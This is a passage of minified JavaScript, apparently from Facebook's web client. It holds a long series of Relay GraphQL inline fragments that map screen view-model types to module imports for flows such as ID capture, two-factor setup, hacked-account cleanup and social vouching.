                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTDigitalIdFlowDontmatchScreenViewModel",
            abstractKey: null,
          },
          gd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardDigitalIdOnboardingScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTDigitalIdFlowOnboardingScreenViewModel",
            abstractKey: null,
          },
          hd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardDigitalIdOutroScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTDigitalIdFlowOutroScreenViewModel",
            abstractKey: null,
          },
          id = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTDismissFlowScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTDismissFlowScreenViewModel",
            abstractKey: null,
          },
          jd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTDismissFlowWithRedirectScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTDismissFlowWithRedirectScreenViewModel",
            abstractKey: null,
          },
          kd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTEscalationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTEscalationScreenViewModel",
            abstractKey: null,
          },
          ld = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTFacebookProtectBenefitsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTFacebookProtectBenefitsScreenViewModel",
            abstractKey: null,
          },
          md = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTFacebookProtectFeaturePasswordCheckScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTFacebookProtectFeaturePasswordCheckScreenViewModel",
            abstractKey: null,
          },
          nd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTFacebookProtectFeatureTwoFactorCheckScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTFacebookProtectFeatureTwoFactorCheckScreenViewModel",
            abstractKey: null,
          },
          od = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTFacebookProtectFinishLaterScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTFacebookProtectFinishLaterScreenViewModel",
            abstractKey: null,
          },
          pd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTFacebookProtectHelpScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTFacebookProtectHelpScreenViewModel",
            abstractKey: null,
          },
          qd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTFacebookProtectIntroScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTFacebookProtectIntroScreenViewModel",
            abstractKey: null,
          },
          rd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTFacebookProtectLearnMoreScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTFacebookProtectLearnMoreScreenViewModel",
            abstractKey: null,
          },
          sd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTFacebookProtectModularProgressScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTFacebookProtectModularProgressScreenViewModel",
            abstractKey: null,
          },
          td = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTFacebookProtectSuccessScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTFacebookProtectSuccessScreenViewModel",
            abstractKey: null,
          },
          ud = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "IXTHackedCleanupEmailPendingConfirmCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHackedCleanupEmailPendingConfirmScreenViewModel",
            abstractKey: null,
          },
          vd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "IXTHackedCleanupInfoCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHackedCleanupInfoScreenViewModel",
            abstractKey: null,
          },
          wd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "IXTHackedCleanupInputCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHackedCleanupInputScreenViewModel",
            abstractKey: null,
          },
          xd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "IXTHackedCleanupLinkedAccountsConfirmCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHackedCleanupLinkedAccountsConfirmScreenViewModel",
            abstractKey: null,
          },
          yd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "IXTHackedCleanupLinkedAccountsSelectCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHackedCleanupLinkedAccountsSelectScreenViewModel",
            abstractKey: null,
          },
          zd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "IXTHackedCleanupPasswordChangeCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHackedCleanupPasswordChangeScreenViewModel",
            abstractKey: null,
          },
          Ad = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "IXTHackedCleanupStepCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHackedCleanupStepScreenViewModel",
            abstractKey: null,
          },
          Bd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTHelloWorldAScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHelloWorldAScreenViewModel",
            abstractKey: null,
          },
          Cd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTHelloWorldBScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHelloWorldBScreenViewModel",
            abstractKey: null,
          },
          Dd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTHelloWorldCometAScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHelloWorldCometAScreenViewModel",
            abstractKey: null,
          },
          Ed = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTHelloWorldCometBScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHelloWorldCometBScreenViewModel",
            abstractKey: null,
          },
          Fd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTHelloWorldCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHelloWorldCometScreenViewModel",
            abstractKey: null,
          },
          Gd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTHelloWorldFirstScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTHelloWorldFirstScreenViewModel",
            abstractKey: null,
          },
          Hd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardCameraCaptureOnboardingScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowCameraCaptureOnboardingScreenViewModel",
            abstractKey: null,
          },
          Id = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardCameraCaptureScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowCameraCaptureScreenViewModel",
            abstractKey: null,
          },
          Jd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardDataStorageInfoScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowDataStorageInfoScreenViewModel",
            abstractKey: null,
          },
          Kd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardDigitalIdMethodSelectScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowDigitalIdMethodSelectScreenViewModel",
            abstractKey: null,
          },
          Ld = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardDocumentTypeSelectScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowDocumentTypeScreenViewModel",
            abstractKey: null,
          },
          Md = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTAuthenticityWizardFilePickerScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowFilePickerScreenViewModel",
            abstractKey: null,
          },
          Nd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardGroupTwoUploadScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowGroupTwoUploadScreenViewModel",
            abstractKey: null,
          },
          Od = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTAuthenticityWizardKarmaErrorScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowKarmaErrorScreenViewModel",
            abstractKey: null,
          },
          Pd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardIdMobileHandoffScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowMobileHandoffScreenViewModel",
            abstractKey: null,
          },
          Qd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardPhotoRequirementsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowPhotoRequirementsScreenViewModel",
            abstractKey: null,
          },
          Rd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSubmissionFeedbackScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowSubmissionFeedbackScreenViewModel",
            abstractKey: null,
          },
          Sd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardIdUploadMethodSelectScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTIdCaptureFlowUploadMethodScreenViewModel",
            abstractKey: null,
          },
          Td = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTSecuredActionPasswordScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTSecuredActionPasswordScreenViewModel",
            abstractKey: null,
          },
          Ud = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSelfieCaptureScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTSelfieCaptureFlowCaptureScreenViewModel",
            abstractKey: null,
          },
          Vd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSelfieCaptureOnboardingScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTSelfieCaptureFlowOnboardingScreenViewModel",
            abstractKey: null,
          },
          Wd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingRequestorIntroScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingRequestorIntroScreenViewModel",
            abstractKey: null,
          },
          Xd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingRequestorOutroScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingRequestorOutroScreenViewModel",
            abstractKey: null,
          },
          Yd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingRequestorSelectFriendsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingRequestorSelectFriendsScreenViewModel",
            abstractKey: null,
          },
          Zd = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingVoucherApproveConfirmScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingVoucherApproveConfirmScreenViewModel",
            abstractKey: null,
          },
          $d = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingVoucherApproveDeclineSelectorScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingVoucherApproveDeclineSelectorScreenViewModel",
            abstractKey: null,
          },
          ae = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingVoucherDeclineRequestScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingVoucherDeclineRequestScreenViewModel",
            abstractKey: null,
          },
          be = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingVoucherExpiredScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingVoucherExpiredScreenViewModel",
            abstractKey: null,
          },
          ce = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingVoucherOnboardingScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingVoucherOnboardingScreenViewModel",
            abstractKey: null,
          },
          de = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingVoucherOutroApproveScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingVoucherOutroApproveScreenViewModel",
            abstractKey: null,
          },
          ee = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingVoucherOutroDeclineScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingVoucherOutroDeclineScreenViewModel",
            abstractKey: null,
          },
          fe = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTAuthenticityWizardSocialVouchingVoucherOutroStopRequestsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBIXTSocialVouchingVoucherOutroStopRequestsScreenViewModel",
            abstractKey: null,
          },
          ge = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTTwoFactorAddPhoneScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTTwoFactorAddPhoneScreenViewModel",
            abstractKey: null,
          },
          he = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTTwoFactorFIDOScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTTwoFactorFIDOScreenViewModel",
            abstractKey: null,
          },
          ie = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTTwoFactorIntroScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTTwoFactorIntroScreenViewModel",
            abstractKey: null,
          },
          je = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTTwoFactorOutroScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTTwoFactorOutroScreenViewModel",
            abstractKey: null,
          },
          ke = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTTwoFactorQRCodeScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTTwoFactorQRCodeScreenViewModel",
            abstractKey: null,
          },
          le = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTTwoFactorSelectMethodScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTTwoFactorSelectMethodScreenViewModel",
            abstractKey: null,
          },
          me = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTTwoFactorSelectPhoneScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTTwoFactorSelectPhoneScreenViewModel",
            abstractKey: null,
          },
          ne = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTTwoFactorTypeCodeScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTTwoFactorTypeCodeScreenViewModel",
            abstractKey: null,
          },
          oe = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTTwoFactorUpsellPhoneScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTTwoFactorUpsellPhoneScreenViewModel",
            abstractKey: null,
          },
          pe = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIXTUFACApp_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTUFACAppScreenViewModel",
            abstractKey: null,
          },
          qe = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "IXTitleBodyCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IXTitleBodyScreenViewModel",
            abstractKey: null,
          },
          re = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometCommunityStandardsLearnMoreModal_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "InformTreatmentLearnMoreScreenViewModel",
            abstractKey: null,
          },
          se = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIntegrityHubAccountStatusScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IntegrityHubAccountStatusScreenViewModel",
            abstractKey: null,
          },
          te = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometAccountStatusActionsListScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IntegrityHubActionsListScreenViewModel",
            abstractKey: null,
          },
          ue = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometIntegrityHubProfileStatusScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "IntegrityHubProfileStatusScreenViewModel",
            abstractKey: null,
          },
          ve = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "M21HarassmentKeepingItFriendlyHomeScreenComet_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "M21HarassmentKeepingItFriendlyScreenViewModel",
            abstractKey: null,
          },
          we = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometMisinfoSeeWhyIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "MisInfoSeeWhyInformTreatmentFollowUpScreenViewModel",
            abstractKey: null,
          },
          xe = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometNFXActionBlockActorConfirmationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "NFXActionBlockActorConfirmationScreenViewModel",
            abstractKey: null,
          },
          ye = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometNFXActionBlockPageConfirmationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "NFXActionBlockPageConfirmationScreenViewModel",
            abstractKey: null,
          },
          ze = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometNFXActionUnfriendConfirmationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "NFXActionUnfriendConfirmationScreenViewModel",
            abstractKey: null,
          },
          Ae = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometNFXActionUnlikeConfirmationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "NFXActionUnlikeConfirmationScreenViewModel",
            abstractKey: null,
          },
          Be = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometNFXActionUnsubscribeConfirmationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "NFXActionUnsubscribeConfirmationScreenViewModel",
            abstractKey: null,
          },
          Ce = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometNFXActionUntagConfirmationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "NFXActionUntagConfirmationScreenViewModel",
            abstractKey: null,
          },
          De = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometNewsworthySeeWhyIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "NewsworthySeeWhyInformTreatmentFollowUpScreenViewModel",
            abstractKey: null,
          },
          Ee = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometPH2022FAVITElectionPreparationsIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "PH2022FAVITElectionPreparationsInformTreatmentFollowUpScreenViewModel",
            abstractKey: null,
          },
          Fe = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "PTFCommunityStandardsCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBPTFCommunityStandardsScreenViewModel",
            abstractKey: null,
          },
          Ge = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "PTFSeeWhyCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBPTFSeeWhyScreenViewModel",
            abstractKey: null,
          },
          He = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometPolicyEducationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "PolicyEducationScreenViewModel",
            abstractKey: null,
          },
          Ie = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometIXTProactiveWarningFollowUpActionsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ProactiveWarningFlowDefaultScreenViewModel",
            abstractKey: null,
          },
          Je = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometProfilePlusAdminEducationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ProfilePlusAdminEducationScreenViewModel",
            abstractKey: null,
          },
          Ke = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometProfilePlusAdminVoiceOnboardingScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ProfilePlusAdminVoiceOnboardingScreenViewModel",
            abstractKey: null,
          },
          Le = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometProfilePlusEducationNuxTourScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ProfilePlusEducationNuxTourScreenViewModel",
            abstractKey: null,
          },
          Me = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometProfilePlusPrivacyTakeoverScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ProfilePlusPrivacyTakeoverScreenViewModel",
            abstractKey: null,
          },
          Ne = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "IXTReshareWarningTemplateRenderer_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ReshareWarningTemplateScreenViewModel",
            abstractKey: null,
          },
          Oe = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
